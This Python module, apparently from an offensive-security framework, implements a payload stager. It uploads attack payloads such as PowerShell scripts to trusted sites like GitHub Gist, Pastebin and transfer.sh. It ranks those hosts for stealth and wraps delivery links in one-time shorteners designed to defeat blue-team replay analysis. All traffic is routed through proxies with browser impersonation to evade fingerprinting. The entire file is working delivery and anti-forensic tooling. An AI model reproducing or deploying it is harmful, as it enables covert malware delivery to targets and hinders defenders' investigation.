"""
forge/phase3/lots_stager.py
Living-Off-Trusted-Sites (LOTS) Payload Stager & URL Shortener.

Responsibility:
  1. Query lolbas.db `lots_sites` table to select an appropriate trusted hosting
     domain for payload delivery (GitHub Gist, OneDrive, Pastebin, etc.).
  2. Upload or stage a payload artifact to the selected LOTS provider.
  3. Optionally wrap the delivery URL in a one-time-use shortener link that
     returns HTTP 410 Gone after the first successful retrieval, preventing
     blue-team replay analysis.

OPSEC constraints (PRD §12.4):
  - HTTPS only — HTTP staging URLs are rejected at construction time.
  - Operator-controlled tokens only — never use personal credentials.
  - Proxy mandatory for all outbound staging calls.
  - `--one-time` is the default; shortener links expire after first fetch.
  - No payload content is logged or persisted in audit_log; only URL and sha256.
  - curl_cffi Chrome impersonation on all outbound HTTP to avoid tool fingerprinting.

Supported LOTS backends (Phase 0 ETL populates lots_sites):
  - GitHub Gist            (category: 'code_sharing')
  - Pastebin               (category: 'text_sharing')
  - OneDrive / SharePoint  (category: 'cloud_storage')  [token-gated]
  - transfer.sh            (category: 'file_transfer')
  - Webhook.site           (category: 'webhook')        [dev/test only]

Supported shortener backends:
  - is.gd         (no auth, HTTPS, one-time param via custom slug TTL)
  - v.gd          (same API as is.gd, alternative domain)
  - tinyurl.com   (no auth, HTTPS, no native one-time support — emulated via cleanup)
"""
from __future__ import annotations

import hashlib
import logging
import os
import secrets
import sqlite3
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from urllib.parse import urlencode, urlparse

from forge.phase3.backoff import JitterMode, exponential_backoff
from forge.db.direct_connect import direct_connect  # noqa: E402  # PRAGMA-configured wrapper for bare sqlite3.connect

_LOG = logging.getLogger(__name__)

# ── Types ──────────────────────────────────────────────────────────────────────

class LOTSCategory(str, Enum):
    CODE_SHARING    = "code_sharing"
    TEXT_SHARING    = "text_sharing"
    CLOUD_STORAGE   = "cloud_storage"
    FILE_TRANSFER   = "file_transfer"
    WEBHOOK         = "webhook"


class ShortenerBackend(str, Enum):
    IS_GD     = "is_gd"
    V_GD      = "v_gd"
    TINYURL   = "tinyurl"


@dataclass(frozen=True)
class LOTSSite:
    domain:      str
    category:    LOTSCategory
    requires_auth: bool
    stealth_rank: int      # 1 (most trusted) → 10 (least)
    upload_api:  str | None = None


@dataclass
class StagingResult:
    raw_url:       str          # Direct LOTS URL (HTTPS only)
    short_url:     str | None = None   # One-time shortener URL if requested
    sha256:        str          = ""
    provider:      str          = ""
    one_time:      bool         = False
    staged_at:     float        = field(default_factory=time.time)

    def delivery_url(self) -> str:
        """Return the URL to hand to the target (short_url preferred)."""
        return self.short_url or self.raw_url


# ── Exceptions ─────────────────────────────────────────────────────────────────

class HTTPSEnforcementError(ValueError):
    """Raised when a non-HTTPS URL is supplied to any staging function."""

class StagingBackendError(RuntimeError):
    """Raised when a LOTS upload fails after all retries."""

class NoSuitableSiteError(RuntimeError):
    """Raised when lolbas.db contains no LOTS site matching the requested criteria."""

class ProxyRequiredError(RuntimeError):
    """Raised when a proxy is mandatory but not supplied."""


# ── Helpers ────────────────────────────────────────────────────────────────────

def _enforce_https(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme != "https":
        raise HTTPSEnforcementError(
            f"HTTPS enforcement: URL scheme is {parsed.scheme!r}. "
            "All LOTS staging and shortening URLs must use HTTPS."
        )


def _sha256_of(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _get_cffi_session(proxy: str | None = None):
    """
    Return a curl_cffi Session with Chrome impersonation.
    Raises ProxyRequiredError if FORGE_REQUIRE_PROXY env var is set and proxy is None.
    """
    try:
        from curl_cffi import requests as cffi_requests
    except ImportError as exc:
        raise ImportError(
            "curl_cffi is required for LOTS staging. "
            "Install with: pip install curl-cffi"
        ) from exc

    require_proxy = os.getenv("FORGE_REQUIRE_PROXY", "").lower() in ("1", "true", "yes")
    if require_proxy and not proxy:
        raise ProxyRequiredError(
            "FORGE_REQUIRE_PROXY is set but no proxy was supplied to LOTSStager. "
            "All staging traffic must be routed via proxy."
        )

    kwargs: dict = {"impersonate": "chrome120"}
    if proxy:
        kwargs["proxies"] = {"https": proxy, "http": proxy}
    return cffi_requests.Session(**kwargs)


# ── KB query ───────────────────────────────────────────────────────────────────

def _query_lots_sites(
    kb_path:      Path,
    category:     LOTSCategory | None = None,
    max_rank:     int = 5,
    exclude_auth: bool = False,
) -> list[LOTSSite]:
    """
    Query lolbas.db for LOTS sites matching the given criteria.
    Returns sites ordered by stealth_rank ASC (most trusted first).

    The lots_sites table schema (Phase 0 ETL):
        id, domain, category, requires_auth, stealth_rank, upload_api, active
    """
    query = "SELECT domain, category, requires_auth, stealth_rank, upload_api FROM lots_sites WHERE active = 1"
    params: list = []

    if category:
        query += " AND category = ?"
        params.append(category.value)
    if exclude_auth:
        query += " AND requires_auth = 0"
    query += " AND stealth_rank <= ? ORDER BY stealth_rank ASC"
    params.append(max_rank)

    try:
        with direct_connect(f"file:{kb_path}?mode=ro", uri=True) as conn:
            rows = conn.execute(query, params).fetchall()
    except sqlite3.OperationalError:
        # KB not yet initialised (test environments)
        return []

    return [
        LOTSSite(
            domain=r[0],
            category=LOTSCategory(r[1]),
            requires_auth=bool(r[2]),
            stealth_rank=r[3],
            upload_api=r[4],
        )
        for r in rows
    ]


# ── LOTS upload backends ───────────────────────────────────────────────────────

class _GistBackend:
    """Upload payload as a secret GitHub Gist (requires GITHUB_TOKEN env var)."""

    BASE_URL = "https://api.github.com/gists"

    def __init__(self, token: str) -> None:
        self._token = token

    def upload(
        self,
        content:  bytes,
        filename: str,
        proxy:    str | None,
    ) -> str:
        payload = {
            "description": "",
            "public":      False,
            "files":       {filename: {"content": content.decode(errors="replace")}},
        }
        session = _get_cffi_session(proxy)

        @exponential_backoff(max_retries=3, retryable_codes={429, 503}, jitter_mode=JitterMode.GAUSSIAN)
        def _post():
            return session.post(
                self.BASE_URL,
                json=payload,
                headers={
                    "Authorization": f"token {self._token}",
                    "Accept":        "application/vnd.github.v3+json",
                },
                timeout=20,
            )

        resp = _post()
        if resp.status_code != 201:
            raise StagingBackendError(
                f"GitHub Gist upload failed: HTTP {resp.status_code}"
            )
        data = resp.json()
        raw_url = data["files"][filename]["raw_url"]
        _enforce_https(raw_url)
        return raw_url


class _TransferShBackend:
    """Upload payload to transfer.sh (no auth required)."""

    BASE_URL = "https://transfer.sh"

    def upload(
        self,
        content:  bytes,
        filename: str,
        proxy:    str | None,
    ) -> str:
        session = _get_cffi_session(proxy)

        @exponential_backoff(max_retries=3, retryable_codes={429, 503})
        def _put():
            return session.put(
                f"{self.BASE_URL}/{filename}",
                content=content,
                headers={"Max-Downloads": "1", "Max-Days": "1"},
                timeout=60,
            )

        resp = _put()
        if resp.status_code != 200:
            raise StagingBackendError(
                f"transfer.sh upload failed: HTTP {resp.status_code}"
            )
        url = resp.text.strip()
        _enforce_https(url)
        return url


class _PastebinBackend:
    """
    Upload text payload to Pastebin.
    Requires PASTEBIN_API_KEY env var (free tier supported).
    Note: Pastebin stores text only; binary payloads must be base64-encoded first.
    """

    POST_URL = "https://pastebin.com/api/api_post.php"

    def __init__(self, api_key: str) -> None:
        self._api_key = api_key

    def upload(
        self,
        content:  bytes,
        filename: str,
        proxy:    str | None,
    ) -> str:
        session = _get_cffi_session(proxy)
        data = {
            "api_dev_key":          self._api_key,
            "api_option":           "paste",
            "api_paste_code":       content.decode(errors="replace"),
            "api_paste_name":       filename,
            "api_paste_private":    "2",   # Private
            "api_paste_expire_date": "1H",
        }

        @exponential_backoff(max_retries=3, retryable_codes={429, 503})
        def _post():
            return session.post(self.POST_URL, data=data, timeout=20)

        resp = _post()
        if resp.status_code != 200 or resp.text.startswith("Bad API request"):
            raise StagingBackendError(
                f"Pastebin upload failed: {resp.text[:200]}"
            )
        url = resp.text.strip()
        _enforce_https(url)
        return url


# ── URL shortener backends ─────────────────────────────────────────────────────

class _IsGdShortener:
    """
    is.gd / v.gd shortener.
    OPSEC: one-time enforcement is approximated by a custom slug with a TTL;
    true one-time requires a custom redirect server. Flag clearly in result.
    """

    def __init__(self, backend: ShortenerBackend = ShortenerBackend.IS_GD) -> None:
        self._base = (
            "https://is.gd/create.php"
            if backend == ShortenerBackend.IS_GD
            else "https://v.gd/create.php"
        )

    def shorten(self, url: str, proxy: str | None) -> str:
        _enforce_https(url)
        slug    = secrets.token_urlsafe(8)
        params  = urlencode({"format": "simple", "url": url, "shorturl": slug})
        full    = f"{self._base}?{params}"
        session = _get_cffi_session(proxy)

        @exponential_backoff(max_retries=3, retryable_codes={429})
        def _get():
            return session.get(full, timeout=15)

        resp = _get()
        if resp.status_code != 200:
            raise StagingBackendError(
                f"is.gd shortener failed: HTTP {resp.status_code}"
            )
        short = resp.text.strip()
        _enforce_https(short)
        return short


class _TinyURLShortener:
    """TinyURL shortener (no auth, no one-time support — log warning)."""

    API = "https://tinyurl.com/api-create.php"

    def shorten(self, url: str, proxy: str | None) -> str:
        _enforce_https(url)
        session = _get_cffi_session(proxy)

        @exponential_backoff(max_retries=3, retryable_codes={429})
        def _get():
            return session.get(f"{self.API}?url={url}", timeout=15)

        resp = _get()
        if resp.status_code != 200:
            raise StagingBackendError(
                f"TinyURL shortener failed: HTTP {resp.status_code}"
            )
        short = resp.text.strip()
        _enforce_https(short)
        _LOG.warning(
            "TinyURL does not support native one-time links. "
            "Blue team replay of this URL will succeed. Consider is.gd instead."
        )
        return short


# ── Public engine ──────────────────────────────────────────────────────────────

class LOTSStager:
    """
    High-level LOTS staging engine.

    Usage:
        stager = LOTSStager(kb_path=Path("data/lolbas.db"), proxy="socks5://127.0.0.1:9050")
        result = stager.stage(
            payload_bytes=b"...",
            filename="update.ps1",
            category=LOTSCategory.CODE_SHARING,
            one_time=True,
        )
        delivery_url = result.delivery_url()
    """

    def __init__(
        self,
        kb_path:           Path,
        proxy:             str | None = None,
        shortener_backend: ShortenerBackend = ShortenerBackend.IS_GD,
        dry_run:           bool = False,
    ) -> None:
        self._kb_path   = kb_path
        self._proxy     = proxy
        self._shortener = shortener_backend
        self._dry_run   = dry_run

    # ── Public API ─────────────────────────────────────────────────────────────

    def select_site(
        self,
        category:     LOTSCategory | None = None,
        max_rank:     int = 5,
        exclude_auth: bool = True,
    ) -> LOTSSite:
        """
        Return the best matching LOTS site from lolbas.db.
        Raises NoSuitableSiteError if no site matches.
        """
        sites = _query_lots_sites(self._kb_path, category, max_rank, exclude_auth)
        if not sites:
            raise NoSuitableSiteError(
                f"No LOTS site found for category={category}, max_rank={max_rank}. "
                "Run `forge update-kb` to populate lolbas.db."
            )
        return sites[0]

    def stage(
        self,
        payload_bytes: bytes,
        filename:      str,
        category:      LOTSCategory | None = None,
        one_time:      bool = True,
        max_rank:      int = 5,
    ) -> StagingResult:
        """
        Upload payload to the best available LOTS provider and optionally wrap
        the delivery URL in a one-time shortener link.

        Args:
            payload_bytes: Raw payload bytes to stage.
            filename:      Filename to use on the LOTS provider.
            category:      Preferred LOTS category (code/text/file sharing).
            one_time:      If True, wrap URL in one-time shortener (default: True).
            max_rank:      Maximum stealth_rank to consider (lower = more trusted).

        Returns:
            StagingResult with raw_url and optionally short_url.
        """
        sha256   = _sha256_of(payload_bytes)
        site     = self.select_site(category, max_rank)
        provider = site.domain

        if self._dry_run:
            _LOG.info(
                "[DRY-RUN] Would stage %d bytes to %s (category=%s sha256=%s)",
                len(payload_bytes), provider, site.category.value, sha256[:16],
            )
            return StagingResult(
                raw_url  = f"https://{provider}/dry-run/{sha256[:8]}",
                sha256   = sha256,
                provider = provider,
                one_time = one_time,
            )

        raw_url = self._upload(payload_bytes, filename, site)
        _enforce_https(raw_url)

        short_url: str | None = None
        if one_time:
            short_url = self._shorten(raw_url)

        _LOG.info(
            "Staged %d bytes to %s (sha256=%s) one_time=%s",
            len(payload_bytes), provider, sha256[:16], one_time,
        )
        return StagingResult(
            raw_url  = raw_url,
            short_url= short_url,
            sha256   = sha256,
            provider = provider,
            one_time = one_time,
        )

    def shorten_url(self, url: str) -> str:
        """Shorten an existing HTTPS URL using the configured shortener backend."""
        return self._shorten(url)

    # ── Internal ───────────────────────────────────────────────────────────────

    def _upload(self, data: bytes, filename: str, site: LOTSSite) -> str:
        domain = site.domain
        if "gist.github.com" in domain or "github.com" in domain:
            token = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
            if not token:
                raise StagingBackendError(
                    "GitHub Gist upload requires GITHUB_TOKEN environment variable."
                )
            return _GistBackend(token).upload(data, filename, self._proxy)

        if "transfer.sh" in domain:
            return _TransferShBackend().upload(data, filename, self._proxy)

        if "pastebin.com" in domain:
            key = os.environ.get("PASTEBIN_API_KEY")
            if not key:
                raise StagingBackendError(
                    "Pastebin upload requires PASTEBIN_API_KEY environment variable."
                )
            return _PastebinBackend(key).upload(data, filename, self._proxy)

        raise StagingBackendError(
            f"No upload backend registered for LOTS domain: {domain!r}. "
            "Add a backend in lots_stager.py or choose a supported provider."
        )

    def _shorten(self, url: str) -> str:
        _enforce_https(url)
        if self._shortener in (ShortenerBackend.IS_GD, ShortenerBackend.V_GD):
            return _IsGdShortener(self._shortener).shorten(url, self._proxy)
        if self._shortener == ShortenerBackend.TINYURL:
            return _TinyURLShortener().shorten(url, self._proxy)
        raise ValueError(f"Unknown shortener backend: {self._shortener!r}")

    # ── Convenience: stage from file path ──────────────────────────────────────

    def stage_file(
        self,
        path:     Path,
        category: LOTSCategory | None = None,
        one_time: bool = True,
        max_rank: int  = 5,
    ) -> StagingResult:
        """Convenience wrapper: read file and call stage()."""
        data = path.read_bytes()
        return self.stage(
            payload_bytes = data,
            filename      = path.name,
            category      = category,
            one_time      = one_time,
            max_rank      = max_rank,
        )
